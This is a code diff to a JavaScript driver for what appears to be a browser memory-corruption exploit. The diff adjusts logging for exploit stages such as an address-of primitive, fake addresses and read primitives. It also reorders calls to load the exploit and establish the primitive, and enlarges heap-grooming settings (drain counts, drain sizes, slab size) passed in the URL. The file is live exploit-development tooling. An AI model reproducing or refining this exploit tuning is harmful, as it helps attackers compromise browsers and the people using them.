@@ -16,7 +16,7 @@ let calibratedOff = null;
 let probeCache = null;
 let logQuiet = 0;
 
-const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-STORED|TRIM-DEBRIS|ADDROF-RELEASE|SSV-GROOM|FAKE-ADDRESS|READ-PRIMITIVE/i;
+const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT/i;
 const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|ABORT|PASS|GIVE-UP|PRIMITIVE|ADDROF-FAIL|ADDROF-NO/i;
 
 const LOG_MAX = 400;
@@ -562,12 +562,14 @@ async function runEstablish() {
     renderLog();
     logQuiet++;
 
+    mark("STEP", "1 - get primitive (12M slots)");
+    mark("NOTE", "close browser fully before this if prior OOM");
+    mark("ATTEMPTS", String(maxAttemptsPick()));
+
     const { establishPrimitive, installWindowP, pairStatus } = await loadExploit();
     const maxAttempts = maxAttemptsPick();
 
     state("establishing primitive...", "warn");
-    mark("STEP", "1 - get primitive (12M slots, lite groom)");
-    mark("ATTEMPTS", String(maxAttempts));
 
     let carrier;
     try {
@@ -819,9 +821,9 @@ function init() {
         url.searchParams.set("clear", "1");
         url.searchParams.delete("slots");
         url.searchParams.delete("g");
-        url.searchParams.append("g", "drain:128");
-        url.searchParams.append("g", "drainsz:16384");
-        url.searchParams.append("g", "slab:1048576");
+        url.searchParams.append("g", "drain:192");
+        url.searchParams.append("g", "drainsz:32768");
+        url.searchParams.append("g", "slab:2097152");
         location.href = url.toString();
     });
 
